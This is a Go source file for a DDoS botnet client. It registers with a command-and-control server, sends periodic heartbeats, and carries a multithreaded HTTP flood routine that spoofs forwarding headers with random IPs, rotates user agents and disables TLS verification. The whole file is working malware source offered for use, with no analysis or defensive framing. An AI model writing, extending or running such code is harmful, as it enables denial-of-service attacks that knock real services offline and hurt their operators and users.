package main

import (
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"sync"
	"sync/atomic"
	"time"
)

type BotConfig struct {
	C2Server string
	BotID    string
}

type AttackStats struct {
	PacketsSent  uint64
	BytesSent    uint64
	SuccessCount uint64
	ErrorCount   uint64
	StartTime    time.Time
}

type DDoSBot struct {
	config     *BotConfig
	stats      *AttackStats
	httpClient *http.Client
	isRunning  atomic.Bool
	wg         sync.WaitGroup
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func NewDDoSBot(c2Server string) *DDoSBot {
	botID := generateBotID()
	
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		MaxIdleConns:        1000,
		MaxIdleConnsPerHost: 1000,
	}
	
	return &DDoSBot{
		config: &BotConfig{
			C2Server: c2Server,
			BotID:    botID,
		},
		stats: &AttackStats{
			StartTime: time.Now(),
		},
		httpClient: &http.Client{
			Transport: tr,
			Timeout:   10 * time.Second,
		},
	}
}

func generateBotID() string {
	hostname, _ := os.Hostname()
	timestamp := time.Now().UnixNano()
	data := fmt.Sprintf("%s-%d-%d", hostname, timestamp, rand.Int63())
	hash := sha256.Sum256([]byte(data))
	return hex.EncodeToString(hash[:8])
}

func (bot *DDoSBot) HTTPFlood(targetURL string, duration int, threads int) {
	bot.isRunning.Store(true)
	fmt.Printf("[%s] Starting HTTP Flood: %s, %d threads, %d seconds\n", 
		bot.config.BotID[:6], targetURL, threads, duration)
	
	for i := 0; i < threads; i++ {
		bot.wg.Add(1)
		go bot.httpFloodWorker(targetURL, duration, i)
	}
	
	bot.wg.Wait()
	fmt.Printf("[%s] HTTP Flood completed\n", bot.config.BotID[:6])
}

func (bot *DDoSBot) httpFloodWorker(targetURL string, duration int, workerID int) {
	defer bot.wg.Done()
	
	timeout := time.After(time.Duration(duration) * time.Second)
	
	for bot.isRunning.Load() {
		select {
		case <-timeout:
			return
		default:
			bot.sendHTTPRequest(targetURL, workerID)
			time.Sleep(time.Millisecond * time.Duration(10+workerID%20))
		}
	}
}

func (bot *DDoSBot) sendHTTPRequest(url string, workerID int) bool {
	headers := map[string]string{
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.5",
		"Accept-Encoding": "gzip, deflate",
		"Connection":      "keep-alive",
		"Cache-Control":   "no-cache",
		"X-Forwarded-For": generateRandomIP(),
		"X-Real-IP":       generateRandomIP(),
	}
	
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		atomic.AddUint64(&bot.stats.ErrorCount, 1)
		return false
	}
	
	for key, value := range headers {
		req.Header.Set(key, value)
	}
	
	req.Header.Set("User-Agent", getRandomUserAgent())
	
	resp, err := bot.httpClient.Do(req)
	if err != nil {
		atomic.AddUint64(&bot.stats.ErrorCount, 1)
		return false
	}
	defer resp.Body.Close()
	
	body, _ := io.ReadAll(resp.Body)
	bytesCount := uint64(len(body) + 200)
	
	atomic.AddUint64(&bot.stats.SuccessCount, 1)
	atomic.AddUint64(&bot.stats.PacketsSent, 1)
	atomic.AddUint64(&bot.stats.BytesSent, bytesCount)
	
	return true
}

func generateRandomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", 
		rand.Intn(255), rand.Intn(255), 
		rand.Intn(255), rand.Intn(255))
}

func getRandomUserAgent() string {
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
	}
	return userAgents[rand.Intn(len(userAgents))]
}

func (bot *DDoSBot) RegisterWithC2() error {
	url := fmt.Sprintf("%s/register?id=%s", bot.config.C2Server, bot.config.BotID)
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

func (bot *DDoSBot) SendHeartbeat() error {
	url := fmt.Sprintf("%s/status?id=%s", bot.config.C2Server, bot.config.BotID)
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

func main() {
	c2Server := os.Getenv("C2_SERVER_URL")
	if c2Server == "" {
		fmt.Println("Error: C2_SERVER_URL environment variable is required")
		return
	}
	
	bot := NewDDoSBot(c2Server)
	
	// Register with C2
	if err := bot.RegisterWithC2(); err != nil {
		fmt.Printf("Failed to register with C2: %v\n", err)
		return
	}
	fmt.Printf("✅ Registered with C2 as bot: %s\n", bot.config.BotID)
	
	// Start heartbeat
	go func() {
		ticker := time.NewTicker(30 * time.Second)
		for range ticker.C {
			bot.SendHeartbeat()
		}
	}()
	
	fmt.Printf("🟡 Bot %s waiting for commands from C2...\n", bot.config.BotID[:6])
	
	// Keep running forever
	select {}
}
